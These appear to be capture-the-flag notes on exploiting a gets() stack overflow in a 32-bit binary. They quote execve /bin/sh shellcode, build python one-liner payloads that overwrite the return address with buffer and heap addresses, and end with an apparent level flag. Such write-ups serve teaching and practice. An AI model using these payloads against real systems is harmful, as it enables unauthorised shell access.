Ok this time arround we can see that gets is still used, so that may be our vector.

This time there is no function that's left uncalled tho, so we need to inject a shell call somehow
This can be done using shellcodes, and there is one right here

https://shell-storm.org/shellcode/files/shellcode-841.html

\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80 ; 21 len

So we need to get that to run, and to do this we still have to overrite the return address

This adds the shellcode at the beginning, then enough padding to fill the buffer


Afterwards we need to add the address of said buffer in order for it to execute

0xbffff6dc seems to be the buffer address, and we can confirm that by printing its content after the gets call

So now just append this to the exploit, but first let's try with basic payload

```python
import struct
struct.pack('<I', 0x0bffff6dc)
b'\xdc\xf6\xff\xbf'

```

python -c 'print ("A" * 80 + "\xdc\xf6\xff\xbf")' > /tmp/exploit

By doing this we find that our exploit kinda worked and we enter a condition that tests agains this exploit.

So we need to print 80 - 27 As

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ABCD

python -c 'print ("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "A" * 53 + "\xdc\xf6\xff\xbf")' > /tmp/exploit

But how do we get it to exec now ? 

Well there is a malloc called later on, and from testing run to run it always gives the same address, 0x804a008, so put this address as a target


```python
import struct
struct.pack('<I', 0x804a008)
b'\x08\xa0\x04\x08'

```

python -c 'print ("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08")' > /tmp/exploit



492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02